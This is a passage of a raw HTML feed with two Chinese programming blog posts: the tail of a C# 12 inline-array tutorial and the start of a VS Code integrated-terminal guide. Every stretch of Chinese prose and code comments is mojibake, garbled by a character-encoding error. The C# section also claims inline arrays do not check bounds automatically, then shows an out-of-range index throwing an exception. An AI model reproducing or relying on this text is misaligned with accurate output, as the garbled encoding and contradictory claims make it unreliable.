<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> Buffer100
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span> _element0;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Length =&gt; <span class="hljs-number">100</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> Span&lt;<span class="hljs-built_in">byte</span>&gt; <span class="hljs-title">AsSpan</span>()</span>
    {
        <span class="hljs-keyword">return</span> MemoryMarshal.CreateSpan(<span class="hljs-keyword">ref</span> <span class="hljs-keyword">this</span>[<span class="hljs-number">0</span>], Length);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> ReadOnlySpan&lt;<span class="hljs-built_in">byte</span>&gt; <span class="hljs-title">AsReadOnlySpan</span>()</span>
    {
        <span class="hljs-keyword">return</span> MemoryMarshal.CreateReadOnlySpan(<span class="hljs-keyword">ref</span> <span class="hljs-keyword">this</span>[<span class="hljs-number">0</span>], Length);
    }
}
</code></pre>
<h3 data-id="heading-14">åº•å±‚åŸç†</h3>
<h4 data-id="heading-15">ç¼–è¯‘åä»£ç ç»“æ„</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// åŸå§‹ä»£ç </span>
[<span class="hljs-meta">InlineArray(5)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> Buffer5 { <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element; }

<span class="hljs-comment">// è¿‘ä¼¼ç¼–è¯‘ç»“æœ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> Buffer5
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element0;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element1;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element2;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element3;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element4;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">ref</span> <span class="hljs-built_in">int</span> <span class="hljs-keyword">this</span>[<span class="hljs-built_in">int</span> index]
    {
        <span class="hljs-keyword">get</span>
        {
            <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">uint</span>)index &gt;= <span class="hljs-number">5</span>)
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IndexOutOfRangeException();
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">ref</span> Unsafe.Add(<span class="hljs-keyword">ref</span> _element0, index);
        }
    }
}
</code></pre>
<h3 data-id="heading-16">é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>
<p>é«˜æ€§èƒ½è®¡ç®—ï¼šæ¸¸æˆå¼•æ“ã€å›¾å½¢å¤„ç†æˆ–ç§‘å­¦è®¡ç®—ä¸­éœ€è¦è¿ç»­å†…å­˜çš„åœºæ™¯ã€‚</p>
</li>
<li>
<p>ç¼“å†²åŒºç®¡ç†ï¼šå¤„ç†å›ºå®šå¤§å°çš„ç¼“å†²åŒºï¼Œå¦‚ç½‘ç»œæ•°æ®åŒ…æˆ–æ–‡ä»¶è¯»å†™ã€‚</p>
</li>
<li>
<p>ä¸æœ¬æœºä»£ç äº¤äº’ï¼šä¸ <code>C/C++</code> æˆ–å…¶ä»–æœ¬æœºåº“äº¤äº’ï¼Œä¼ é€’è¿ç»­å†…å­˜å—ã€‚</p>
</li>
<li>
<p>æ›¿ä»£å°å‹æ•°ç»„ï¼šåœ¨ç»“æ„ä½“ä¸­æ›¿ä»£ <code>T[]</code> å­—æ®µï¼Œå‡å°‘å †åˆ†é…ã€‚</p>
</li>
<li>
<p>å‘é‡/çŸ©é˜µæ“ä½œï¼šè¡¨ç¤ºæ•°å­¦å‘é‡æˆ–çŸ©é˜µï¼Œä¼˜åŒ–å†…å­˜è®¿é—®ã€‚</p>
</li>
</ul>
<h3 data-id="heading-17">æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-18">ä»…é™ç»“æ„ä½“ï¼š</h4>
<ul>
<li>
<p>åªèƒ½å®šä¹‰åœ¨ <code>struct</code> ä¸­ï¼Œä¸èƒ½ç”¨äº <code>class</code>ã€‚</p>
</li>
<li>
<p>è¿™æ˜¯å› ä¸ºç»“æ„ä½“æ˜¯å€¼ç±»å‹ï¼Œå†…å­˜åˆ†é…æ›´å¯æ§ã€‚</p>
</li>
</ul>
<h4 data-id="heading-19">å›ºå®šå¤§å°ï¼š</h4>
<ul>
<li>
<p>å†…è”æ•°ç»„çš„å¤§å°åœ¨ç¼–è¯‘æ—¶å¿…é¡»æ˜¯å¸¸é‡ï¼Œæ— æ³•åŠ¨æ€è°ƒæ•´ã€‚</p>
</li>
<li>
<p>ä¸é€‚åˆéœ€è¦å˜é•¿æ•°ç»„çš„åœºæ™¯ã€‚</p>
</li>
</ul>
<h4 data-id="heading-20">å•ä¸€å­—æ®µé™åˆ¶ï¼š</h4>
<ul>
<li>
<p>å¸¦æœ‰ <code>[InlineArray]</code> çš„ç»“æ„ä½“åªèƒ½åŒ…å«ä¸€ä¸ªå­—æ®µã€‚</p>
</li>
<li>
<p>å¦‚æœéœ€è¦å…¶ä»–å­—æ®µï¼Œå¿…é¡»ä½¿ç”¨åµŒå¥—ç»“æ„ä½“ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">InlineArray(10)</span>]
<span class="hljs-keyword">struct</span> InvalidBuffer
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _otherField; <span class="hljs-comment">// é”™è¯¯ï¼šåªèƒ½æœ‰ä¸€ä¸ªå­—æ®µ</span>
}
</code></pre>
<h4 data-id="heading-21">æ€§èƒ½ä¼˜åŠ¿ï¼š</h4>
<ul>
<li>
<p>å†…è”æ•°ç»„åˆ†é…åœ¨æ ˆä¸Šï¼ˆå¯¹äºå±€éƒ¨å˜é‡ï¼‰æˆ–åµŒå…¥ç»“æ„ä½“ä¸­ï¼Œå‡å°‘å †åˆ†é…ã€‚</p>
</li>
<li>
<p>è¿ç»­å†…å­˜å¸ƒå±€å‡å°‘ç¼“å­˜æœªå‘½ä¸­ï¼ˆ<code>cache miss</code>ï¼‰ï¼Œæé«˜æ€§èƒ½ã€‚</p>
</li>
</ul>
<h4 data-id="heading-22">ç‰ˆæœ¬è¦æ±‚ï¼š</h4>
<ul>
<li>
<p>å†…è”æ•°ç»„æ˜¯ <code>C# 12ï¼ˆ.NET 8ï¼‰</code>çš„æ–°ç‰¹æ€§ï¼Œéœ€ç¡®ä¿é¡¹ç›®ç›®æ ‡æ¡†æ¶ä¸º <code>.NET 8.0</code> æˆ–æ›´é«˜ã€‚</p>
</li>
<li>
<p>éœ€è¦ <code>System.Runtime.CompilerServices.InlineArray</code> ç‰¹æ€§ã€‚</p>
</li>
</ul>
<h4 data-id="heading-23">ç´¢å¼•è¶Šç•Œï¼š</h4>
<ul>
<li>
<p>å†…è”æ•°ç»„æ”¯æŒç´¢å¼•è®¿é—®ï¼Œä½†ä¸ä¼šè‡ªåŠ¨æ£€æŸ¥è¶Šç•Œã€‚</p>
</li>
<li>
<p>ä½¿ç”¨ <code>Span&lt;T&gt;</code> æ“ä½œæ—¶ï¼Œ<code>Span&lt;T&gt;</code> ä¼šæä¾›è¾¹ç•Œæ£€æŸ¥ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">InlineArray(2)</span>]
<span class="hljs-keyword">struct</span> SmallBuffer
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _element;
}

<span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> SmallBuffer();
buffer[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// è¿è¡Œæ—¶å¼‚å¸¸ï¼šç´¢å¼•è¶Šç•Œ</span>
</code></pre>
<h4 data-id="heading-24">ä¸æ™®é€šæ•°ç»„çš„å¯¹æ¯”ï¼š</h4>
<ul>
<li>
<p>æ™®é€šæ•°ç»„ï¼ˆ<code>T[]</code>ï¼‰ï¼šåˆ†é…åœ¨æ‰˜ç®¡å †ä¸Šï¼ŒåŠ¨æ€å¤§å°ï¼Œæ”¯æŒåƒåœ¾å›æ”¶ã€‚</p>
</li>
<li>
<p>å†…è”æ•°ç»„ï¼šå›ºå®šå¤§å°ï¼ŒåµŒå…¥ç»“æ„ä½“ï¼Œè¿ç»­å†…å­˜ï¼Œé€‚åˆé«˜æ€§èƒ½åœºæ™¯ã€‚</p>
</li>
</ul>
<h3 data-id="heading-25">ä¸å…¶ä»–ç‰¹æ€§çš„å¯¹æ¯”</h3>
<h4 data-id="heading-26">ä¸æ™®é€šæ•°ç»„ï¼ˆT[]ï¼‰çš„å¯¹æ¯”ï¼š</h4>
<ul>
<li>
<p>æ™®é€šæ•°ç»„æ˜¯å¼•ç”¨ç±»å‹ï¼Œåˆ†é…åœ¨å †ä¸Šï¼Œå¤§å°å¯åŠ¨æ€è°ƒæ•´ã€‚</p>
</li>
<li>
<p>å†…è”æ•°ç»„æ˜¯å€¼ç±»å‹çš„ä¸€éƒ¨åˆ†ï¼Œå›ºå®šå¤§å°ï¼Œå†…å­˜è¿ç»­ï¼Œæ€§èƒ½æ›´é«˜ã€‚</p>
</li>
</ul>
<h4 data-id="heading-27">ä¸å›ºå®šå¤§å°ç¼“å†²åŒºï¼ˆfixedï¼‰çš„å¯¹æ¯”ï¼š</h4>
<ul>
<li>
<p><code>C#</code> çš„ <code>fixed</code> å…³é”®å­—ç”¨äºåœ¨ <code>unsafe</code> ä¸Šä¸‹æ–‡ä¸­åˆ›å»ºå›ºå®šå¤§å°ç¼“å†²åŒºã€‚</p>
</li>
<li>
<p>å†…è”æ•°ç»„æ˜¯ç±»å‹å®‰å…¨çš„ï¼Œæ— éœ€ <code>unsafe</code>ï¼Œæ›´æ˜“ç”¨ã€‚</p>
</li>
</ul>
<h4 data-id="heading-28">ä¸ <code>Span&lt;T&gt;/Memory&lt;T&gt;</code> çš„å¯¹æ¯”ï¼š</h4>
<ul>
<li>
<p>å†…è”æ•°ç»„æ˜¯æ•°æ®çš„å­˜å‚¨ç»“æ„ï¼Œè€Œ <code>Span&lt;T&gt;å’ŒMemory&lt;T&gt;</code>æ˜¯è®¿é—®è§†å›¾ã€‚</p>
</li>
<li>
<p>å†…è”æ•°ç»„å¯ç›´æ¥è½¬æ¢ä¸º <code>Span&lt;T&gt;</code>ï¼Œç»“åˆä½¿ç”¨æ•ˆç‡æ›´é«˜ã€‚</p>
</li>
</ul>
<h4 data-id="heading-29">ä¸æ ˆåˆ†é…ï¼ˆstackallocï¼‰çš„å¯¹æ¯”ï¼š</h4>
<ul>
<li>
<p><code>stackalloc</code> åœ¨æ ˆä¸Šåˆ†é…ä¸´æ—¶å†…å­˜ï¼Œç”Ÿå‘½å‘¨æœŸçŸ­ã€‚</p>
</li>
<li>
<p>å†…è”æ•°ç»„åµŒå…¥ç»“æ„ä½“ï¼Œæ”¯æŒæ›´çµæ´»çš„ç”Ÿå‘½å‘¨æœŸå’Œä¼ é€’ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VS Codeç»ˆç«¯ä»å…¥é—¨åˆ°ç²¾é€šå®Œå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7581995152190849066</link>    <guid>https://juejin.cn/post/7581995152190849066</guid>    <pubDate>2025-12-10T11:32:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581995152190849066" data-draft-id="7582003642191986730" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VS Codeç»ˆç«¯ä»å…¥é—¨åˆ°ç²¾é€šå®Œå…¨æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2025-12-10T11:32:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VS Codeç»ˆç«¯ä»å…¥é—¨åˆ°ç²¾é€šå®Œå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T11:32:13.000Z" title="Wed Dec 10 2025 11:32:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å½“å‰ï¼ŒVisual Studio Codeçš„é›†æˆç»ˆç«¯å·²æˆä¸ºå¼€å‘è€…æ—¥å¸¸å·¥ä½œä¸­ä¸å¯æˆ–ç¼ºçš„å·¥å…·ã€‚å®ƒä¸ä»…èƒ½è¿è¡Œ <code>echo</code>ã€ <code>ls</code> å’Œ <code>git</code> ç­‰å‘½ä»¤ï¼Œè¿˜ä¸ç¼–è¾‘å™¨æ·±åº¦é›†æˆï¼Œæ”¯æŒå·¥ä½œåŒºæ–‡ä»¶é“¾æ¥å’Œé”™è¯¯æ£€æµ‹ç­‰åŠŸèƒ½ã€‚æ— è®ºä½ æ˜¯ä½¿ç”¨Bashã€Zshè¿˜æ˜¯PowerShellï¼ŒVS Codeç»ˆç«¯éƒ½èƒ½æ»¡è¶³ä½ çš„éœ€æ±‚ã€‚</p>
<p>æ‰“å¼€ç»ˆç«¯çš„ä¸‰ç§æ–¹å¼ï¼š</p>
<ul>
<li>å¿«æ·é”®ï¼š <code>Ctrl+``ï¼ˆWindows/Linuxï¼‰æˆ–</code>Cmd+``ï¼ˆmacOSï¼‰</li>
<li>èœå•æ ï¼š<strong>æŸ¥çœ‹ &gt; ç»ˆç«¯</strong></li>
<li>å‘½ä»¤é¢æ¿ï¼š <code>Ctrl+Shift+P</code> è¾“å…¥<strong>ç»ˆç«¯ï¼šæ–°å»ºç»ˆç«¯</strong></li>
</ul>
<p>ç»ˆç«¯é»˜è®¤å·¥ä½œç›®å½•ä¸ºå½“å‰æ‰“å¼€çš„VS Codeé¡¹ç›®æ ¹ç›®å½•ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥ç›´æ¥è¿è¡Œä¸é¡¹ç›®ç›¸å…³çš„å‘½ä»¤ï¼Œæ— éœ€é¢å¤–åˆ‡æ¢è·¯å¾„ã€‚</p>
<h2 data-id="heading-0">åŸºç¡€æ“ä½œ</h2>
<p>VS Codeç»ˆç«¯æä¾›ä¸°å¯Œçš„äº¤äº’åŠŸèƒ½ï¼Œè®©ä½ èƒ½å¤Ÿé«˜æ•ˆåœ°ä¸å‘½ä»¤è¾“å‡ºè¿›è¡Œäº¤äº’ã€‚å‘½ä»¤é€šå¸¸ä¼šè¾“å‡ºæ–‡ä»¶è·¯å¾„æˆ–URLï¼Œä½ åªéœ€æŒ‰ä½Ctrl/Cmdé”®ï¼Œå°†é¼ æ ‡æ‚¬åœåœ¨æ–‡ä»¶åä¸Šï¼Œç„¶åç‚¹å‡»é“¾æ¥ï¼ŒVS Codeä¼šè‡ªåŠ¨åœ¨ç¼–è¾‘å™¨ä¸­æ‰“å¼€è¯¥æ–‡ä»¶ã€‚å¯¹äºURLï¼Œç‚¹å‡»åä¼šåœ¨é»˜è®¤æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84d6c57dd60b450e92beef7718da6538~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5LqL5ryr6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765971132&amp;x-signature=4H%2FOhO%2FDF18%2BzKMRRk2OyHbSps8%3D" alt="image.png" loading="lazy"/></p>
<p>æ ¸å¿ƒå¿«æ·é”®ä¸€è§ˆï¼š</p>
<ul>
<li>æ–°å»ºç»ˆç«¯ï¼š `Ctrl+Shift+``</li>
<li>åˆ‡æ¢ç»ˆç«¯ï¼š <code>Ctrl+PageUp/PageDown</code></li>
<li>åˆ†å±ç»ˆç«¯ï¼š <code>Ctrl+\</code>ï¼ˆWindows/Linuxï¼‰æˆ– <code>Cmd+\</code>ï¼ˆmacOSï¼‰</li>
<li>å…³é—­ç»ˆç«¯ï¼š <code>Ctrl+Shift+W</code></li>
</ul>
<p>å‘½ä»¤å†å²å¯¼èˆªï¼š</p>
<ul>
<li>å‘ä¸ŠæŸ¥çœ‹å†å²å‘½ä»¤ï¼š <code>â†‘</code> é”®</li>
<li>å‘ä¸‹æŸ¥çœ‹å†å²å‘½ä»¤ï¼š <code>â†“</code> é”®</li>
<li>æœç´¢å†å²å‘½ä»¤ï¼š <code>Ctrl+R</code>ï¼ˆBash/Zshï¼‰æˆ– <code>F8</code>ï¼ˆPowerShellï¼‰</li>
</ul>
<p>åˆ›å»ºå‘½ä»¤åˆ—è¡¨æ–‡ä»¶ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Bash/Zsh</span>
<span class="hljs-built_in">ls</span> -l /usr/bin &gt; Command.txt

<span class="hljs-comment"># PowerShell</span>
Get-Command | Out-File -FilePath .\Command.txt
</code></pre>
<h2 data-id="heading-1">é…ç½®æ–‡ä»¶</h2>
<p>ç»ˆç«¯é…ç½®æ–‡ä»¶æ˜¯ç‰¹å®šäºå¹³å°çš„shellé…ç½®ï¼Œç”±å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ã€å‚æ•°å’Œå…¶ä»–è‡ªå®šä¹‰é¡¹ç»„æˆã€‚VS Codeä¼šè‡ªåŠ¨æ£€æµ‹å‡ ä¸ªå¸¸è§çš„é…ç½®æ–‡ä»¶ï¼Œä½ ä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œè‡ªå®šä¹‰æˆ–æ·»åŠ æ–°çš„é…ç½®æ–‡ä»¶ã€‚</p>
<p>è®¾ç½®é»˜è®¤é…ç½®æ–‡ä»¶æ­¥éª¤ï¼š</p>
<ul>
<li>æ‰“å¼€å‘½ä»¤é¢æ¿ï¼ˆ <code>Ctrl+Shift+P</code>ï¼‰</li>
<li>æœç´¢"ç»ˆç«¯: é€‰æ‹©é»˜è®¤é…ç½®æ–‡ä»¶"</li>
<li>ä»ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©ä½ å¸¸ç”¨çš„shell</li>
</ul>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒLinuxå’ŒmacOSä¸Šçš„é»˜è®¤shellæ˜¯ <code>$SHELL</code> ç¯å¢ƒå˜é‡æŒ‡å®šçš„ç¨‹åºï¼ŒWindowsç³»ç»Ÿé»˜è®¤ä½¿ç”¨PowerShellã€‚</p>
<p>è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼ˆsettings.jsonï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.profiles.windows&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    &amp;#<span class="hljs-number">34</span>;PowerShell - NoProfile&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      &amp;#<span class="hljs-number">34</span>;source&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;PowerShell&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
      &amp;#<span class="hljs-number">34</span>;args&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>&amp;#<span class="hljs-number">34</span>;-NoProfile&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    &amp;#<span class="hljs-number">34</span>;Git Bash&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      &amp;#<span class="hljs-number">34</span>;path&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;C<span class="hljs-punctuation">:</span>\\Program Files\\Git\\bin\\bash.exe&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
      &amp;#<span class="hljs-number">34</span>;args&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>&amp;#<span class="hljs-number">34</span>;--login&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.defaultProfile.windows&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;Git Bash&amp;#<span class="hljs-number">34</span>;
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-2">Shellé›†æˆ</h2>
<p>VS Codeèƒ½å¤Ÿä¸å¸¸è§çš„Shellé›†æˆï¼Œä½¿ç»ˆç«¯å¯ä»¥æ›´æ·±å…¥åœ°äº†è§£Shellå†…éƒ¨çš„æƒ…å†µã€‚è¿™ç§é›†æˆå¯ç”¨äº†å·¥ä½œç›®å½•æ£€æµ‹ã€å‘½ä»¤æ£€æµ‹ã€è£…é¥°å’Œå¯¼èˆªç­‰æœ‰ç”¨åŠŸèƒ½ã€‚</p>
<p>æ”¯æŒçš„ShellåŒ…æ‹¬Linux/macOSä¸Šçš„bashã€fishã€pwshã€zshï¼Œä»¥åŠWindowsä¸Šçš„Git Bashå’Œpwshã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ä»VS Codeå¯åŠ¨å—æ”¯æŒçš„Shellæ—¶ï¼ŒShellé›†æˆè„šæœ¬ä¼šè‡ªåŠ¨æ¿€æ´»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44b355fbec424e5e8275491b8a54f1f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5LqL5ryr6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765971132&amp;x-signature=NXlmF6%2Fyz06hJSfBTsrjT04vTVs%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰‹åŠ¨å®‰è£…Shellé›†æˆï¼ˆä»¥bashä¸ºä¾‹ï¼‰ï¼š</p>
<ul>
<li>æ‰“å¼€é…ç½®æ–‡ä»¶ï¼š <code>code ~/.bashrc</code></li>
<li>æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">[[ &amp;<span class="hljs-comment">#34;$TERM_PROGRAM&amp;#34; == &amp;#34;vscode&amp;#34; ]] &amp;&amp; . &amp;#34;$(code --locate-shell-integration-path bash)&amp;#34;</span>
</code></pre>
<ul>
<li>é‡æ–°åŠ è½½é…ç½®ï¼š <code>source ~/.bashrc</code></li>
</ul>
